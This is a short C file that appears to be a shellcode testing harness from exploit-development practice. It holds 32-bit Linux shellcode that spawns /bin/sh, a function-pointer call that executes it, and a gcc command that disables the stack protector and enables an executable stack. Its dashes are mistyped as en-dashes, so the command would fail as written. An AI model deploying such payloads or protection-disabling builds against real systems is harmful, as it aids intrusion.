#include <stdio.h>
#include <string.h>
//gcc -m32 -o shelltest1 shelltest1.c –fno-stack-protector –mpreferred-stack-boundary=2 –z execstack
unsigned char shellcode[]="\xb8\x0b\x00\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80";
int main(){
    int (*ret)() = (int(*)()) shellcode;
    ret();
}
